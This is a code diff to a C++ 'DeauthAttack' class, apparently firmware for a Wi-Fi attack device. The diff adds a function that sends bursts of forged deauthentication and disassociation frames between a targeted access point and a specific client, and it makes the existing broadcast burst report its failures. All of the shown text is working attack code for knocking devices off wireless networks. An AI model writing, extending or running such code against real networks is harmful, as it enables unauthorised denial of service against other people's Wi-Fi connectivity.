@@ -86,7 +86,7 @@ static void deauthTaskFn(void* p) {
 DeauthAttack::DeauthAttack(DisplayManager& displayManager, WiFiFunctions& wifiFunctions)
     : displayManager(displayManager), wifiFunctions(wifiFunctions) {}
 
-void DeauthAttack::sendBroadcastBurst(const uint8_t* bssid) {
+uint32_t DeauthAttack::sendBroadcastBurst(const uint8_t* bssid) {
     uint8_t frame[26];
     volatile uint32_t ok = 0, fail = 0;
     for (int r = 0; r < 5; r++) {
@@ -95,6 +95,21 @@ void DeauthAttack::sendBroadcastBurst(const uint8_t* bssid) {
         buildFrame(frame, BROADCAST, bssid, bssid, true);
         sendFrame3x(frame, ok, fail);
     }
+    return fail;
+}
+
+uint32_t DeauthAttack::sendDirectedBurst(const uint8_t* bssid, const uint8_t* client) {
+    uint8_t frame[26];
+    volatile uint32_t ok = 0, fail = 0;
+    for (int r = 0; r < 2; r++) {
+        // AP -> client
+        buildFrame(frame, client, bssid, bssid, false); sendFrame3x(frame, ok, fail);
+        buildFrame(frame, client, bssid, bssid, true);  sendFrame3x(frame, ok, fail);
+        // client -> AP
+        buildFrame(frame, bssid, client, bssid, false); sendFrame3x(frame, ok, fail);
+        buildFrame(frame, bssid, client, bssid, true);  sendFrame3x(frame, ok, fail);
+    }
+    return fail;
 }
 
 bool DeauthAttack::parseMac(const char* str, uint8_t* mac) {
